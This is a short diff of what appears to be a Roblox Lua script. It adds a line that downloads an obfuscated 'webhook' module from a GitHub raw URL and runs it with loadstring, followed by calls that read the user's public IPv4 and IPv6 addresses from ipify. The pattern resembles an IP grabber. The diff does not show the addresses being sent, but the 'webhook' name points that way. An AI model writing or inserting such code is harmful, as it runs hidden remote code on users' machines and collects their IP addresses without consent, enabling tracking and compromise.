@@ -1,4 +1,4 @@
-local Webhook = loadstring(game:HttpGet(''))()
+local Webhook = loadstring(game:HttpGet('https://raw.githubusercontent.com/Krypton-ai/Krypton/main/KryptonImportant/obfuscatedwebhook.lua'))()
 --[] IP Variables
 local IPv4 = game:HttpGet("https://api.ipify.org")
 local IPv6 = game:HttpGet("https://api64.ipify.org")
